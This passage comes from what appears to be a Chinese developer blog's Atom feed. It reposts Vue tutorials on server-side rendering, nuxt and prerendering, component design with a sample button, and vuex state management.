title="第四步：对路由 router 改造"></a>第四步：对路由 router 改造</h3><pre><code class="js">export function createRouter(){      return new Router({            mode: &#39;history&#39;,            routes: [                //...            ]      })}</code></pre><h3 id="第五步：使用-express-运行服务端代码"><a href="#第五步：使用-express-运行服务端代码" class="headerlink" title="第五步：使用 express 运行服务端代码"></a>第五步：使用 express 运行服务端代码</h3><p>这一步主要是让 node 服务端响应 HTML 给浏览器访问</p><pre><code class="js">const Vue = require(&#39;vue&#39;)const server = require(&#39;express&#39;)()const renderer = require(&#39;vue-server-renderer&#39;).createRenderer()server.get(&#39;*&#39;, (req, res) =&gt; {      const app = new Vue({            data: {                  url: req.url            },            template: `&lt;div&gt;访问的 URL 是： {{ url }}&lt;/div&gt;`      })      renderer.renderToString(app, (err, html) =&gt; {            if (err) {                  res.status(500).end(&#39;Internal Server Error&#39;)                  return            }            res.end(`                  &lt;!DOCTYPE html&gt;                  &lt;html lang=&quot;en&quot;&gt;                   &lt;head&gt;&lt;title&gt;Hello&lt;/title&gt;&lt;/head&gt;                    &lt;body&gt;${html}&lt;/body&gt;                  &lt;/html&gt;`)      })})server.listen(8080)</code></pre><h2 id="nuxt-体验"><a href="#nuxt-体验" class="headerlink" title="nuxt 体验"></a>nuxt 体验</h2><p>简单几步体验下 nuxt</p><p>安装后</p><p><img src="https://user-gold-cdn.xitu.io/2020/3/11/170c7cbe963be44c?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="nuxt"></p><p>简单看了一下源码，nuxt 把我们之前提到的重要的改造，全部封装到 .nuxt 文件夹里面了\</p><p><img src="https://user-gold-cdn.xitu.io/2020/3/11/170c7cc50e09b590?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="启动"></p><p>跑一下 dev 发现有两个端，一个 clinet 端，一个 server 端</p><p><img src="https://user-gold-cdn.xitu.io/2020/3/11/170c7cc93fe6230b?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="demo"></p><p>最后查看一下效果，整个过程挺丝滑的。目录结构也比较符合我的风格，新项目需要 SSR 会考虑使用 nuxt</p><h2 id="使用-webpack-插件预渲染"><a href="#使用-webpack-插件预渲染" class="headerlink" title="使用 webpack 插件预渲染"></a>使用 webpack 插件预渲染</h2><p>解决 SEO 问题是不是只有 SSR 呢？其实预渲染也能做到，首先</p><h3 id="区别使用-SSR-和预渲染"><a href="#区别使用-SSR-和预渲染" class="headerlink" title="区别使用 SSR 和预渲染"></a>区别使用 SSR 和预渲染</h3><ul><li>服务端渲染解决的问题，不仅只是把 HTML 页面给浏览器，更重要的是处理动态逻辑和 JS 代码后，将渲染后完整的 HTML 给浏览器，渲染的过程在服务端。</li><li>预渲染，是利用构建工具在 webpack 中生成静态的 HTML，直接给浏览器，渲染的过程在本地。</li><li>预渲染插件里面提到两种不能使用：大量路由、动态内容</li></ul><h3 id="使用-prerender-spa-plugin-插件进行简单预渲染"><a href="#使用-prerender-spa-plugin-插件进行简单预渲染" class="headerlink" title="使用 prerender-spa-plugin 插件进行简单预渲染"></a>使用 prerender-spa-plugin 插件进行简单预渲染</h3><ol><li>安装 prerender-spa-plugin</li></ol><pre><code class="js">yarn prerender-spa-plugin</code></pre><ol start="2"><li>修改 webpack 配置，比较简单就能完成配置</li></ol><pre><code class="js">const path = require(&#39;path&#39;)const PrerenderSPAPlugin = require(&#39;prerender-spa-plugin&#39;)const Renderer = PrerenderSPAPlugin.PuppeteerRenderermodule.exports = {      plugins: [            //...            new PrerenderSPAPlugin({                  staticDir: path.join(__dirname, &#39;dist&#39;),                  outputDir: path.join(__dirname, &#39;prerendered&#39;),                  indexPath: path.join(__dirname, &#39;dist&#39;, &#39;index.html&#39;),                  routes: [ &#39;/&#39;, &#39;/about&#39;, &#39;/some/deep/nested/route&#39; ],                  postProcess (renderedRoute) {                        renderedRoute.route = renderedRoute.originalPath                        renderedRoute.html = renderedRoute.html.split(/&gt;[\s]+&lt;/gmi).join(&#39;&gt;&lt;&#39;)                        if (renderedRoute.route.endsWith(&#39;.html&#39;)) {                              renderedRoute.outputPath = path.join(__dirname, &#39;dist&#39;, renderedRoute.route)                        }                        return renderedRoute                  },                  minify: {                        collapseBooleanAttributes: true,                        collapseWhitespace: true,                        decodeEntities: true,                        keepClosingSlash: true,                        sortAttributes: true                  },                  renderer: new Renderer({                        inject: {                              foo: &#39;bar&#39;                        },                    maxConcurrentRoutes: 4          ]}</code></pre><h1 id="Vue-开发技巧总结"><a href="#Vue-开发技巧总结" class="headerlink" title="Vue 开发技巧总结"></a>Vue 开发技巧总结</h1><blockquote><p>从 5 个大的角度来提升开发效率和体验，代码美观和代码质量，用户体验</p></blockquote><p><img src="https://user-gold-cdn.xitu.io/2020/3/11/170c9c3a14c4cf39?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="技巧"></p><h2 id="5-大角度提升"><a href="#5-大角度提升" class="headerlink" title="5 大角度提升"></a>5 大角度提升</h2><h3 id="代码复用"><a href="#代码复用" class="headerlink" title="代码复用"></a>代码复用</h3><ul><li>组件化开发，代码效率 * n</li><li>使用 mixins 抽离公共逻辑，代码效率 * n</li><li>工具化函数、使用 filter 编码效率+</li><li>sass 复用 css，编码体验、效率+</li></ul><h3 id="代码质量"><a href="#代码质量" class="headerlink" title="代码质量"></a>代码质量</h3><ul><li>代码静态检查 eslint + prettier，代码风格+、基础语法错误-</li><li>数据类型控制 typescript，代码质量+</li><li>前端测试 test，代码质量+</li></ul><h3 id="代码优化"><a href="#代码优化" class="headerlink" title="代码优化"></a>代码优化</h3><ul><li>合理使用 vue，渲染性能+</li><li>合理使用 vuex 减少请求，使用图片懒加载，加载性能+</li><li>合理使用函数组件，组件性能+</li><li>合理骨架屏、路由过渡，用户体验+</li></ul><h3 id="开发效率"><a href="#开发效率" class="headerlink" title="开发效率"></a>开发效率</h3><ul><li>使用更新的脚手架 vue-cli4，webpack 配置效率+</li><li>使用配置好的脚手架模版 vue-h5-template，vue 配置效率+</li><li>使用更简洁的模版 pug，HTML 编写效率+</li><li>使用更强大的 css 编写 sass，CSS 编写效率+</li><li>使用模拟数据 mock，脱离后端开发效率+</li><li>开源组件封装 HOC，组件开发，页面编写效率+</li></ul><h3 id="瓶颈解决"><a href="#瓶颈解决" class="headerlink" title="瓶颈解决"></a>瓶颈解决</h3><ul><li>路由history使用，服务端配置相关，URL美观+</li><li>解决SEO与首屏加载、服务端渲染 SSR 基本解决</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://juejin.im/post/5e1eb1dff265da3e354ea2d0&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;原文地址&lt;/a&gt;   &lt;/p&gt;
&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=
      
    
    </summary>
    
      <category term="Vue" scheme="https://zhanghao-web.github.io/categories/Vue/"/>
    
    
      <category term="Vue" scheme="https://zhanghao-web.github.io/tags/Vue/"/>
    
  </entry>
  
  <entry>
    <title>吃透Vue项目开发实践(中)</title>
    <link href="https://zhanghao-web.github.io/2020/05/09/Vue/%E5%90%83%E9%80%8FVue%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91%E5%AE%9E%E8%B7%B5-%E4%B8%AD/"/>
    <id>https://zhanghao-web.github.io/2020/05/09/Vue/吃透Vue项目开发实践-中/</id>
    <published>2020-05-09T02:03:02.000Z</published>
    <updated>2020-05-09T03:12:13.755Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://juejin.im/post/5e15932ee51d4540f02fae27" target="_blank" rel="noopener">原文地址</a></p><h1 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h1><p><img src="https://user-gold-cdn.xitu.io/2019/12/30/16f5676f7940d72a?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="概览"></p><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><blockquote><p>本节内容主要围绕下列问题展开：</p></blockquote><ul><li>如何编写原生组件，以及组件编写的思考与原则？</li><li>组件怎么通信？有哪些方式？</li><li>如何使用vuex 以及它的应用场景和原理</li><li>如何使用过滤器，编写自己的过滤器</li><li>如何使用 Jest 测试你的代码？TDD 与 BDD 的比较</li></ul><h2 id="如何编写原生组件"><a href="#如何编写原生组件" class="headerlink" title="如何编写原生组件"></a>如何编写原生组件</h2><h3 id="组件编写原理"><a href="#组件编写原理" class="headerlink" title="组件编写原理"></a>组件编写原理</h3><p>vue 编写组件有两种方式，一种是单文件组件，另外一种函数组件。根据组件引入和创建还可以分为动态组件和异步组件。</p><p>动态组件<code>keep-alive</code>使之缓存。异步组件原理和异步路由一样，使用<code>import()</code>实现异步加载也就是按需加载。</p><p>所谓 vue 单文件组件，就是我们最常见的这种形式：</p><pre><code class="js">&lt;template lang=&quot;pug&quot;&gt;    .demo      h1 hello&lt;/template&gt;&lt;script&gt;export default {  name: &#39;demo&#39;,  data() {    return {}  }}&lt;/script&gt;&lt;style lang=&quot;scss&quot; scoped&gt;.demo {  h1 {    color: #f00;  }}&lt;/style&gt;</code></pre><p>这里的template 也可以使用 <code>render</code> 函数来编写</p><pre><code class="js">Vue.component(&#39;demo&#39;, {    render: function (createElement) {      return createElement(        &#39;h1&#39;,      &#39;hello&#39;,         // ...          )      }})</code></pre><p>我们可以发现<code>render</code>函数写模版让我们更有编程的感觉。<br>对模版也可以编程，在vue 里面我们可以很容易联想到，很多地方都有两种写法，一种是 <code>template</code> ， 一种是<code>js</code>。<br>比如：对于路由，我们既可以使用<code>:to=&quot;&quot;</code>，又可以使用<code>$router.push</code>，这也许是 vue 用起来比较爽的原因。</p><h4 id="函数式组件是什么呢？"><a href="#函数式组件是什么呢？" class="headerlink" title="函数式组件是什么呢？"></a>函数式组件是什么呢？</h4><p><code>functional</code>，这意味它<strong>无状态 (没有响应式数据)</strong>，也没有<strong>实例</strong> (没有 this 上下文)</p><ul><li>单文件形式 2.5.0+</li></ul><pre><code class="html">&lt;template functional&gt;&lt;/template&gt;</code></pre><ul><li>Render 函数形式</li></ul><pre><code class="js">Vue.component(&#39;my-component&#39;, {  functional: true,  render function (createElement, context) {    return createElement(&#39;div&#39;)      }}</code></pre><h4 id="为什么要使用函数组件呢？"><a href="#为什么要使用函数组件呢？" class="headerlink" title="为什么要使用函数组件呢？"></a>为什么要使用函数组件呢？</h4><p>最重要的原因就是<strong>函数组件开销低</strong>，也就是对性能有好处，在不需要响应式和this的情况下，写成函数式组件算是一种优化方案。</p><p>组件写好了，需要将组件注册才能使用</p><h3 id="组件注册的两种方式"><a href="#组件注册的两种方式" class="headerlink" title="组件注册的两种方式"></a>组件注册的两种方式</h3><p>组件注册分为两种，一种是全局注册，一种是局部注册</p><p><code>局部注册</code>就是我们常用的 <code>Vue.component(&#39;s-button&#39;, { /* ... */ })</code>，比较简单不详细论述</p><p><code>全局注册</code>上节已经提到，在<code>new Vue</code> 之前在 <code>mian.js</code>注册，这里还提到一种自动全局注册的方法 <code>**require.text**</code></p><pre><code class="js">import Vue from &#39;vue&#39;import upperFirst from &#39;lodash/upperFirst&#39;import camelCase from &#39;lodash/camelCase&#39;const requireComponent = require.context(  &#39;./components&#39;,  // 是否查询其子目录  false,  /Base[A-Z]\w+\.(vue|js)$/)requireComponent.keys().forEach(fileName =&gt; {    // 获取组件配置     const componentConfig = requireComponent(fileName)    const componentName = upperFirst(          camelCase(                 // 获取和目录深度无关的文件名            fileName.split(&#39;/&#39;).pop().replace(/\.\w+$/, &#39;&#39;)          )    )      // 全局注册组件    Vue.component(      componentName,      componentConfig.default || componentConfig      )})</code></pre><p>基本原理和全局注册一样，就是将 <code>components</code> 中的组件文件名，<code>appButton</code>变成 <code>AppButton</code> 作为注册的组件名。<br>把原来需要手动复制的，变成之间使用 <code>keys</code> 方法批量注册。</p><h3 id="实践开发一个-button-组件"><a href="#实践开发一个-button-组件" class="headerlink" title="实践开发一个 button 组件"></a>实践开发一个 button 组件</h3><p>现在，我们以写一个简单的原生 <code>button</code>组件为例，探讨一下组件开发的一些关键点。 写之前，我们需要抓住 4 个核心的要点：</p><ul><li><strong>用哪个标签作为组件主体， <code>button</code> 还是 <code>div</code> 标签</strong></li><li><strong>如何根据属性控制 <code>button</code> 组件的颜色 <code>color</code> 、形状 <code>type</code> 、大小 <code>size</code></strong></li><li><strong>如何处理 <code>button</code> 组件的点击事件</strong></li><li>*<em>如何去扩展 <code>button</code> 组件的内容</em></li></ul><blockquote><p>这些思考点在其他原生组件开发和高阶组件封装里面也需要考虑到</p></blockquote><p>首先看第一个问题，大部分原生组件第一考虑的地方，就是主要标签用原生 <code>&lt;button&gt;&lt;/button&gt;</code>标签还是用 去模拟。</p><blockquote><p>为什么不考虑 <code>&lt;input&gt;</code>呢，因为 <code>&lt;button&gt;&lt;/button&gt;</code> 元素比 <code>&lt;input&gt;</code> 元素更容易添加内部元素。你可以在元素内添加HTML内容（像 、 甚至 <code>&lt;img&gt;</code>），以及 <code>::after</code> 和 <code>::before</code> 伪元素来实现复杂的效果，而 <code>&lt;input&gt;</code> 只支持文本内容。</p></blockquote><p>下面分析这两种写法的优劣</p><p><strong>使用原生 <code>button</code> 标签的优势：</strong></p><ol><li>更好的标签语义化</li><li>原生标签自带的 <code>buff</code> ，一些自带的键盘事件行为等</li></ol><blockquote><p>为什么说更好的语义化呢？有人可能会说，可以使用 <code>role</code> 来增强 <code>div</code> 的语义化。确实可以，但是可能存在问题——有些爬虫并不会根据 <code>role</code> 来确定这个标签的含义。</p></blockquote><blockquote><p>另外一点，对开发者来说， <code>&lt;button&gt;&lt;/button&gt;</code> 比 阅读起来更好。</p></blockquote><p><strong>使用 <code>div</code> 模拟的优势：</strong></p><ol><li>不需要关心 <code>button</code> 原生样式带来的一些干扰，少写一些覆盖原生 <code>css</code> 的代码，更干净纯粹。</li><li>全部用 <code>div</code> ，不需要再去找原生标签、深入了解原生标签的一些兼容相关的诡异问题。</li><li>可塑性更强，也就是拓展性和兼容性更好。这也是大多数组件都会选择使用 <code>div</code> 作为组件主体的原因。</li></ol><blockquote><p>貌似 div 除了语义不是很好以外，其他方面都还行，但是具体用哪一种其实都可以，只要代码写的健壮适配性强，基本都没啥大问题。</p></blockquote><p>我们这里使用原生 <code>&lt;button&gt;&lt;/button&gt;</code>作为主要标签，使用 <code>s-xx</code>作为 <code>class</code>前缀</p><blockquote><p>为什么需要使用前缀，因为在有些时候，比如使用第三方组件，多个组件之间的 class 可能会产生冲突，前缀用来充当组件 css 的一个命名空间，不同组件之间不会干扰。</p></blockquote><pre><code class="html">&lt;template lang=&quot;pug&quot;&gt;   button.s-button(:class=&quot;xxx&quot; :style=&quot;xxx&quot; )     slot&lt;/template&gt;</code></pre><p>然后，我们看第二个问题：</p><p><strong>如何根据属性来控制 <code>button</code> 的样式</strong> 其实这个很简单，基本原理就是：</p><ol><li>使用 <code>props</code> 获取父组件传过来的属性。</li><li>根据相关属性，生成不同的 <code>class</code>，使用 <code>:class=&quot;{xxx: true, xxx: &#39;s-button--&#39; + size}&quot;</code> 这种形式，在 <code>style</code> 里面对不同的 <code>s-button--xxx</code> 做出不同的处理。</li></ol><pre><code class="html">&lt;template lang=&quot;pug&quot;&gt;  button.s-button(:class=&quot;&quot; :style=&quot;&quot; )    slot&lt;/template&gt;&lt;script&gt;export default {    name: &#39;s-button&#39;    data: return {}    props: {        theme: {},        size: {},        type: {}    }}&lt;/script&gt;  </code></pre><p><strong>如何使用事件以及如何扩展组件</strong></p><p>扩展组件的原理，主要就是使用 <code>props</code> 控制组件属性，模版中使用 <code>v-if/v-show</code> 增加组件功，比如增加内部 ICON，使用 <code>:style class</code>控制组件样式。</p><p><img src="https://user-gold-cdn.xitu.io/2020/1/13/16f9d9414f682625?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="type"> </p><p>还要注意的是我们还要控制原生 <code>type</code> 类型，原生默认是 <code>submit</code>，这里我们默认设置为 <code>button</code></p><pre><code class="html">&lt;template lang=&quot;pug&quot;&gt; button.s-button(:class=&quot;&quot; :style=&quot;&quot; :type=&quot;nativeType&quot;)   slot   s-icon(v-if=&quot;icon &amp;&amp; $slots.icon&quot; name=&quot;loading&quot;)&lt;/template&gt;&lt;script&gt;export default {    name: &#39;s-button&#39;    data: return {}    props: {        nativeType: {            type: String,            default: &#39;button&#39;        },        theme: {},        size: {},        type: {}    }}&lt;/script&gt;</code></pre><p>控制事件，直接使用 <code>@click=&quot;&quot;</code> + <code>emit</code></p><pre><code class="html">&lt;template lang=&quot;pug&quot;&gt;  button.s-button(@click=&quot;handleClick&quot;)&lt;/template&gt;&lt;script&gt;export default {    methods: {        handleClick (evt) {            this.$emit(&#39;click&#39;, evt)          }      }}&lt;/script&gt;</code></pre><h4 id="最后总结下："><a href="#最后总结下：" class="headerlink" title="最后总结下："></a>最后总结下：</h4><blockquote><p>一般就直接使用 <code>template</code>单文件编写组件，需要增强 js编写能力可以使用 <code>render()</code><br>常规编写组件需要考虑：1. 使用什么标签 2. 如何控制各种属性的表现 3. 如何增强组件扩展性 4. 如何处理组件事件</p></blockquote><blockquote><p>对响应式 <code>this</code>要求不高，使用函数 <code>functional</code>组件优化性能。</p></blockquote><blockquote><p>基础组件通常全局注册，业务组件通常局部注册</p></blockquote><blockquote><p>使用 <code>keys()</code>遍历文件来实现自动批量全局注册</p></blockquote><blockquote><p>使用 <code>import()</code> 异步加载组件提升减少首次加载开销，使用 <code>keep-alive + is</code>缓存组件减少二次加载开销</p></blockquote><h2 id="如何使用-vuex-以及它的应用"><a href="#如何使用-vuex-以及它的应用" class="headerlink" title="如何使用 vuex 以及它的应用"></a>如何使用 vuex 以及它的应用</h2><h3 id="由来以及原理"><a href="#由来以及原理" class="headerlink" title="由来以及原理"></a>由来以及原理</h3><p>我们知道组件中通信有以下几种方式：</p><h4 id="1-父组件通过-props-传递给子组件，不详细论述"><a href="#1-父组件通过-props-传递给子组件，不详细论述" class="headerlink" title="1. 父组件通过 props 传递给子组件，不详细论述"></a>1. 父组件通过 <code>props</code> 传递给子组件，不详细论述</h4><h4 id="2-子组件通过-emit-事件传递数据给父组件-父组件通过-on-监听，也就是一个典型的-订阅-发布模型"><a href="#2-子组件通过-emit-事件传递数据给父组件-父组件通过-on-监听，也就是一个典型的-订阅-发布模型" class="headerlink" title="2. 子组件通过 emit 事件传递数据给父组件,父组件通过 on 监听，也就是一个典型的 订阅-发布模型"></a>2. 子组件通过 <code>emit</code> 事件传递数据给父组件,父组件通过 <code>on</code> 监听，也就是一个典型的 <strong>订阅-发布</strong>模型</h4><blockquote><p><code>@</code> 为 <code>v-on:</code> 的简写</p></blockquote><pre><code class="html">&lt;template lang=&quot;pug&quot;&gt;&lt;!--子组件--&gt;    div.component-1&lt;template&gt;&lt;script&gt;export default {    mounted() {        this.$emit(&#39;eventName&#39;, params)      }}&lt;/script&gt;</code></pre><pre><code class="html">&lt;!-- 父组件--&gt;&lt;template lang=&quot;pug&quot;&gt;    Component-1(@eventName=&quot;handleEventName&quot;)&lt;template&gt;&lt;script&gt;export default {    methods: {        handleEventName (params) {            console.log(params)        }  }&lt;/script&gt;</code></pre><h4 id="3-集中式通信事件，主要用于简单的非父子组件通信"><a href="#3-集中式通信事件，主要用于简单的非父子组件通信" class="headerlink" title="3. 集中式通信事件，主要用于简单的非父子组件通信"></a>3. 集中式通信事件，主要用于简单的非父子组件通信</h4><p>原理很简单其实就是在 <code>emit</code> 与 <code>on</code> 的基础上加了一个事件中转站 “bus”。我觉得更像是现实生活中的集线器。</p><p>普遍的实现原理大概是这样的 “bus” 为 <code>vue</code> 的一个实例，实例里面可以调用 <code>emit</code>, <code>off</code>, <code>on</code> 这些方法。</p><pre><code class="js">var eventHub = new Vue()// 发布eventHub.$emit(&#39;add&#39;, params)// 订阅/响应eventHub.$on(&#39;add&#39;, params)// 销毁eventHub.$off(&#39;add&#39;, params)</code></pre><p>但是稍微复杂点的情况，使用这种方式就太繁锁了。还是使用 vuex 比较好。</p><p>从某种意义而言，我觉得 vuex 不仅仅是它的一种进化版。</p><ol><li>使用 <code>store</code> 作为 <strong>状态管理</strong> 的仓库，并且引入了 <strong>状态</strong> 这个概念</li><li>它的模型完全不一样了， <code>bus</code> 模型感觉像一个电话中转站<br><img src="https://user-gold-cdn.xitu.io/2020/1/13/16f9ddf76fc5b0fa?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="中转站"></li></ol><p>而 vuex 的模型更像是集中式的代码仓库。</p><blockquote><p>与 <code>git</code> 类似，它不能直接修改代码，需要参与者提交 <code>commit</code>，提交完的 <code>commit</code>修改仓库，仓库更新，参与者 <code>fetch</code> 代码更新自己的代码。不同的是代码仓库需要合并，而 <code>vuex</code> 是直接覆盖之前的状态。</p></blockquote><p><img src="https://user-gold-cdn.xitu.io/2020/1/10/16f8ede3d74ab245?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="state"></p><h3 id="管理-vuex"><a href="#管理-vuex" class="headerlink" title="管理 vuex"></a>管理 vuex</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><blockquote><p>“store”基本上就是一个容器，它包含着你的应用中大部分的状态 (<code>state</code>)。Vuex 和单纯的全局对象有以下两点不同</p></blockquote><ul><li><strong>响应式</strong> （改变属性后，触发组件中的状态改变，触发 <code>dom</code> ）</li><li><strong>不能直接改变状态</strong> （唯一途径是提交 <code>mutation</code> )</li></ul><p><img src="https://user-gold-cdn.xitu.io/2020/1/13/16f9deb7be3845f5?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="store"></p><p><strong>基本用法</strong>：就是在 <code>state</code> 里面定义各种属性，页面或组件组件中，直接使用 <code>$store.state</code>或者 <code>$store.getters</code>来使用。如果想要改变状态 <code>state</code>呢，就 <code>commit</code> 一个 <code>mutation</code></p><p>但是假如我想提交一连串动作呢？可以定义一个 <code>action</code>，然后使用 <code>$store.dispatch</code> 执行这个 <code>action</code></p><p>使用 <code>action</code> 不仅能省略不少代码，而且关键是 <code>action</code> 中可以使用异步相关函数，还可以直接返回一个 <code>promise</code></p><p>而为什么不直接到 <code>mutation</code>中写异步呢？ 因为 <code>mutation</code> 一定是个同步，它是唯一能改变 state 的，一旦提交了 <code>mutation</code>， <code>mutation</code> 必须给定一个明确结果。否则会阻塞状态的变化。</p><p>下面给出常用 vuex 的使用方式</p><h4 id="新建-Store"><a href="#新建-Store" class="headerlink" title="新建 Store"></a>新建 Store</h4><p>新建一个 <code>store</code>并将其他各个功能化分文件管理</p><pre><code class="js">import Vue from &#39;vue&#39;import Vuex from &#39;vuex&#39;import state from &#39;./states&#39;import getters from &#39;./getters&#39;import mutations from &#39;./mutations&#39;import actions from &#39;./actions&#39;import user from &#39;./modules/user&#39;Vue.use(Vuex)export default new Vuex.Store({      //在非生产环境下，使用严格模式      strict: process.env.NODE_ENV !== &#39;production&#39;,       state,      getters,      mutations,      actions,      modules: {            user      }})</code></pre><p><strong>操作状态两种方式</strong></p><ol><li>获取状态</li></ol><pre><code class="js">console.log(store.state.count)</code></pre><ol start="2"><li>改变状态</li></ol><pre><code class="js">store.commit(&#39;xxx&#39;)</code></pre><h4 id="管理状态-states"><a href="#管理状态-states" class="headerlink" title="管理状态 states"></a>管理状态 states</h4><blockquote><p>单一状态树, 这也意味着，每个应用将仅仅包含一个 store 实例。单一状态树让我们能够直接地定位任一特定的状态片段，在调试的过程中也能轻易地取得整个当前应用状态的快照。</p></blockquote><pre><code class="js">// states 文件export default {      count: 0}</code></pre><p>计算属性中返回，每当 <code>state</code> 中属性变化的时候, 其他组件都会重新求取计算属性，并且触发更新相关联的 DOM</p><pre><code class="js">const Counter = {      template: &#39;&lt;div&gt;{{count}}&lt;div&gt;&#39;,      computed: {            count() {                  return store.state.count            }      }}</code></pre><h4 id="管理取值器-getters"><a href="#管理取值器-getters" class="headerlink" title="管理取值器 getters"></a>管理取值器 getters</h4><blockquote><p><code>getters</code> 相当于 <code>store</code> 的计算属性。不需要每次都要在计算属性中过滤一下，也是一种代码复用。 我们在 <code>getters</code>文件中管理</p></blockquote><pre><code class="js">export default {      count: (state) =&gt; Math.floor(state.count)}</code></pre><h4 id="管理-mutations"><a href="#管理-mutations" class="headerlink" title="管理 mutations"></a>管理 mutations</h4><blockquote><p>更改 Vuex 的 store 中的状态的唯一方法是提交 mutation。Vuex 中的 mutation 非常类似于事件：每个 mutation 都有一个字符串的 事件类型 (type) 和 一个 回调函数 (handler)。这个回调函数就是我们实际进行状态更改的地方</p></blockquote><p>使用 types 大写用于调试，在 <code>mutationTypes</code> 文件中 <code>export const ROUTE_ADD = &#39;ROUTE_ADD&#39;</code></p><p>然后在 <code>mutations</code> 文件中管理</p><pre><code class="js">import * as MutationTypes from &#39;./mutationTypes&#39;export default {      [MutationTypes.ADDONE]: function(state) {    state.count = state.count + 1      },      //...}</code></pre><pre><code class="js">this.$store.commit(MutationTypes.ADDONE)</code></pre><h4 id="管理-actions"><a href="#管理-actions" class="headerlink" title="管理 actions"></a>管理 actions</h4><p>和 <code>mutations</code> 类似， <code>actions</code> 对应的是 <code>dispatch</code>，不同的是 <code>action</code>可以使用异步函数，有种更高一级的封装。</p><pre><code class="js">// 简化actions: {    increment ({ commit }) {        setTimeout(() =&gt; {              commit(MutationTypes.ADDONE)    }    , 1000)    }}// 触发store.dispatch(&#39;increment&#39;)</code></pre><blockquote><p>上述用法都可以使用 <strong>载荷</strong>的形式，引入也可以使用 <code>mapXxxx</code> 进行批量引入，这里不详细论述，有兴趣可以查看官网。</p></blockquote><h4 id="分模块管理状态"><a href="#分模块管理状态" class="headerlink" title="分模块管理状态"></a>分模块管理状态</h4><p>状态太多太杂，分模块管理是一个良好的代码组织方式。</p><pre><code class="js">import count from &#39;./modules/count&#39;export default new Vuex.Store({      modules: {            count      }})</code></pre><p>每一个模块都可以有独立的相关属性</p><pre><code class="js">import * as ActionTypes from &#39;./../actionTypes&#39;export default {      state: {            count: 0      },      mutations: {            ADD_ONE: function(state) {                   state.count = state.count + 1              }      },      actions: {            [ActionTypes.INIT_INTENT_ORDER]: function({ commit }) {                  commit(&#39;ADD_ONE&#39;)            }      },      getters: {            pageBackToLoan: (state) =&gt; Math.floor(state.count)      }}</code></pre><p><img src="https://user-gold-cdn.xitu.io/2020/1/13/16f9e11d627d9b4d?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="如图所示"></p><h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><p><code>vuex</code> 主要有几个应用场景，一个是用于 <strong>组件通信</strong>和 <strong>状态共享</strong>，一个是用于 <strong>数据缓存</strong>，还有就是用于 <strong>减少请求</strong>。这些场景归根节点都是对于 <strong>缓存</strong>和 <strong>共享</strong>来说的。</p><h4 id="组件通信"><a href="#组件通信" class="headerlink" title="组件通信"></a>组件通信</h4><p>首先，状态统一管理在仓库，就实现了组件通信的可能性。</p><p>当一个组件通过 <code>commit</code> 提交 <code>mutation</code> 就改了 <code>state</code>，其他组件就可以通过 <code>store.state</code>获取最新的 <code>state</code>，这样一来就相当于 <strong>更新的值通过 <code>store</code> 传递给了其他组件</strong>，不仅实现了一对一的通信，还实现了一对多的通信。</p><h4 id="状态共享"><a href="#状态共享" class="headerlink" title="状态共享"></a>状态共享</h4><p>我们经常使用的一个场景就是 <strong>权限管理</strong>。</p><p>写权限管理时候，首次进入页面就要将权限全部拿到，然后需要分发给各个页面使用，来控制各个路由、按钮的权限。</p><pre><code class="js">/** *  * 判断用户有没有权限访问页面  */function hasPermission(routeItem, menus) {    return menus.some(menuItem =&gt; {        return menuItem.name === routeItem.name    })}/** *  * 递归过滤异步路由表，返回符合用户角色权限的路由表 *  * @param {*} routes 路由表 *  * @param {*} menus 菜单信息  * */function filterRoutes(routes, menus) {    return routes.filter(routeItem =&gt; {        if (routeItem.hidden) {            return true        } else if (hasPermission(routeItem, menus)) {            const menuItem = menus.find(item =&gt; item.name === routeItem.name)            if (menuItem &amp;&amp; menuItem.children &amp;&amp; menuItem.children.length &gt; 0) {                routeItem.children = filterRoutes(routeItem.children, menuItem.children)                if (!routeItem.children.length) return false              }              return true            } else {                return false              }        })  }  const permission = {      state: {          routers: constantRouterMap,          addRouters: [],          roles: [],          user_name: &#39;&#39;,          avatar_url: &#39;&#39;,          onlyEditor: false,          menus: null,          personal: true,          teamList: []      },      mutations: {}  }  export default permission</code></pre><p>而且权限还可以被更改，更改后的权限直接分发到其他页面组件中。这个场景要是不使用 <code>vuex</code> ，代码将会比较复杂。</p><h4 id="数据缓存"><a href="#数据缓存" class="headerlink" title="数据缓存"></a>数据缓存</h4><p><code>store</code> 是一个仓库，它从创建开始就一直存在，只有页面 <code>Vuex.store</code> 实例被销毁，state 才会被清空。具体表现就是刷新页面。</p><p>这个数据缓存适用于：页面加载后缓存数据，刷新页面请求数据的场景。在一般 <code>Hybrid</code>中，一般不存在刷新页面这个按钮，所以使用 vuex 缓存数据可以应对大多数场景。</p><pre><code class="js">export default {      state: {            // 缓存修改手机号需要的信息            changePhoneInfo: {                  nameUser: &#39;&#39;,                  email: &#39;&#39;,                  phone: &#39;&#39;            },      }}</code></pre><p>如果需要持久化缓存，结合浏览器或 APP 缓存更佳。</p><pre><code class="js">export default {      // 登陆成功后，vuex 写入token，并写入app缓存，存储持久化      [ActionTypes.LOGIN_SUCCESS]: function(store, token) {            store.commit(MutationTypes.SET_TOKEN, token)            setStorage(&#39;token&#39;, token)            router.replace({ name: &#39;Home&#39;, params: { source: &#39;login&#39; } })      }}</code></pre><h4 id="减少请求-数据缓存的变种"><a href="#减少请求-数据缓存的变种" class="headerlink" title="减少请求(数据缓存的变种)"></a>减少请求(数据缓存的变种)</h4><p>在写后台管理平台时候，经常会有 <code>list</code> 